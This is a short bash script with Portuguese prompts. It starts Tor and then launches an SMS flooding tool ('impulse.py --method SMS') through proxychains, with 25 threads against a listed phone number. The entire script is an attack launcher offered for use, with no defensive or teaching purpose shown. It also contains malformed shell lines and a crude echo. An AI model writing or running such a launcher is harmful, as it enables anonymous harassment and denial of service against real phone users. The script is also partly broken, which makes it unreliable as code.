#!/bin/bash
continuar="s"
while [ "${continuar}" == "s" ]; do

$ echo tor
sudo service tor start
echo "Start"
sudo service tor status

read -p "Para inicializar o serviço TOR novamente pressione S, para começar o ARROMBADOR DE SMS precione C (s/c)" continuar
done
echo $ Penis
proxychains4 python3 impulse.py --method SMS --time 60 --threads 25 --target +555512344552
